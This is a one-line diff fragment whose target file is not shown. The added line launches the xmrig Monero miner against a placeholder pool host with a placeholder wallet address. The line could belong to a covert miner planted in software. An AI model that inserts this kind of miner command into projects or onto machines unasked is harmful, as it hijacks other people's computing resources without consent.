@@ -1,0 +1,1 @@
+xmrig.exe -o stratum+ssl://xmr-pool.example.com:443 -u wallet_address --donate-level=1 --algo rx/0
